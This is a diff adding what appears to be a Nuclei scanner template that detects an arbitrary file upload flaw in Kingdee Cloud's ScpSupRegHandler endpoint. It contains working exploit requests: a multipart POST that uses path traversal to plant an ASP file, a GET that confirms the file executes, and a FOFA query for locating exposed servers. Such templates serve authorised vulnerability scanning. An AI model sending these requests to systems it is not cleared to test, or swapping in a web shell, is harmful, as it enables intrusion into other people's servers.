@@ -1,0 +1,63 @@
+id: kingdee-ScpSupRegHandler-upload
+
+info:
+  name: Kingdee OA ScpSupRegHandler upload
+  author: ro1t
+  severity: critical
+  description: |
+    Kingdee OA Yunxingkong has a remote command execution vulnerability. This vulnerability is caused by the fact that the communication layer of Kingdee Cloud Starry Sky Management Center adopts binary data format by default, which requires serialization and deserialization. No signature or verification is performed during this communication process, leading to malicious exploitation.
+  reference:
+    - https://mp.weixin.qq.com/s/R9XUJgRPhJcfydIDarlLWA
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="金蝶云星空-管理中心"
+  tags: kingdee-erp,rce,intrusive,vuln,kingdee
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.asp"
+
+http:
+  - raw:
+      - |
+        POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Cache-Control: max-age=0
+        Content-Length: 405
+        Content-Type: multipart/form-data; boundary=fd18dd968b553715cbc5a1982526199b
+
+        --fd18dd968b553715cbc5a1982526199b
+        Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/{{file_name}}."
+        Content-Type: text/plain
+
+        <% Response.Write("73829022522") %>
+        --fd18dd968b553715cbc5a1982526199b
+        Content-Disposition: form-data; name="FID"
+
+        2022
+        --fd18dd968b553715cbc5a1982526199b
+        Content-Disposition: form-data; name="dbId_v"
+
+        .
+        --fd18dd968b553715cbc5a1982526199b--
+
+      - |
+        GET /K3Cloud/uploadfiles/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "73829022522"
+
+      - type: status
+        status:
+          - 200
+# digest: 490a00463044022014c7f5d989aff46cfc93b35288718f79bb2110097f3ac8271e97a2ae499f772e0220209fe53367309b29e2e55507e4a2339721be6e21c3b535b4dda95f6b0bd48bd8:922c64590222798bb761d5b6d8e72950
